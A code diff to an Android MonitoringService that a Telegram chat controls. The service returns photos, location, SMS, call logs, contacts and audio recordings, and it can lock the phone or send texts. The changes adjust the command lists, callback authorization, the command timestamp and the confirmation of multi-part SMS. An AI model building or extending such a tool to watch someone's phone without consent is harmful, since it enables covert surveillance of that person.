@@ -105,7 +105,7 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
-        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/ping")
+        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
@@ -646,9 +646,8 @@ class MonitoringService : Service() {
         if (response.code() == 400) {
             try {
                 val body = response.errorBody()?.string()?.lowercase(java.util.Locale.ROOT).orEmpty()
-                if (body.contains("offset") || body.contains("bad request")) {
-                    val cur = try { preferencesManager.lastUpdateId } catch (_: Exception) { 0L }
-                    if (cur < 0L) preferencesManager.setLastUpdateIdSync(0L)
+                if (body.contains("offset")) {
+                    try { preferencesManager.setLastUpdateIdSync(0L) } catch (_: Exception) { }
                 }
             } catch (_: Exception) {
             }
@@ -726,7 +725,10 @@ class MonitoringService : Service() {
         val sender = query.from?.id?.toString() ?: return
         val chatId = try { preferencesManager.chatId } catch (_: Exception) { "" }
         val originChat = try { query.message?.chat?.id?.toString().orEmpty() } catch (_: Exception) { "" }
-        if (sender != chatId && originChat != chatId) return
+        if (sender != chatId && originChat != chatId) {
+            try { answerCallback(query.id) } catch (_: Exception) { }
+            return
+        }
         val ownerOk = isOwner(sender)
         answerCallback(query.id)
         val command = when (query.data) {
@@ -743,22 +745,8 @@ class MonitoringService : Service() {
             "pause60" -> "/pause 60"
             else -> return
         }
-        val base = command.substringBefore(" ").substringBefore("@").lowercase(java.util.Locale.ROOT)
-        val msgDate = try { query.message?.date ?: 0L } catch (_: Exception) { 0L }
         val originOk = originChat.isNotEmpty() && originChat == chatId
-        if (base in MUTATING_COMMANDS) {
-            if (msgDate > 0L) {
-                handleTelegramCommand(command, msgDate, ownerOk, originOk)
-            } else {
-                handleTelegramCommand(command, 1L, ownerOk, originOk)
-            }
-        } else {
-            if (msgDate > 0L) {
-                handleTelegramCommand(command, msgDate, ownerOk, originOk)
-            } else {
-                handleTelegramCommand(command, 1L, ownerOk, originOk)
-            }
-        }
+        handleTelegramCommand(command, 0L, ownerOk, originOk)
     }
 
     private fun postAuthFailureReminder(code: Int) {
@@ -1889,14 +1877,15 @@ class MonitoringService : Service() {
         }
         val expected = parts.size.coerceAtLeast(1)
         val okCount = java.util.concurrent.atomic.AtomicInteger(0)
+        val failCount = java.util.concurrent.atomic.AtomicInteger(0)
         val counting = object : android.content.BroadcastReceiver() {
             override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                 if (intent?.action != sentAction) return
                 try {
                     if (resultCode == android.app.Activity.RESULT_OK) {
-                        if (okCount.incrementAndGet() >= expected) delivered.complete(true)
+                        if (okCount.incrementAndGet() >= expected && failCount.get() == 0) delivered.complete(true)
                     } else {
-                        delivered.complete(false)
+                        if (failCount.incrementAndGet() == 1) delivered.complete(false)
                     }
                 } catch (_: Exception) {
                 }
@@ -1937,13 +1926,15 @@ class MonitoringService : Service() {
                     )
                     smsManager.sendTextMessage(number, null, smsText, sentIntent, null)
                 }
-                val confirmed = withTimeoutOrNull(60_000L) { delivered.await() } ?: false
+                val confirmed = withTimeoutOrNull(60_000L + (expected - 1) * 30_000L) { delivered.await() } ?: false
                 if (confirmed) {
                     preferencesManager.lastSmsSendAt = System.currentTimeMillis()
                     preferencesManager.pendingSmsNumber = ""
                     preferencesManager.pendingSmsText = ""
                     preferencesManager.pendingSmsAt = 0L
                     sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
+                } else if (okCount.get() > 0) {
+                    sendToTelegram("\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Check the recipient before retrying; pending kept, try /smsconfirm again.")
                 } else {
                     sendToTelegram("\u26A0\uFE0F SMS not confirmed sent. Pending kept, try /smsconfirm again.")
                 }
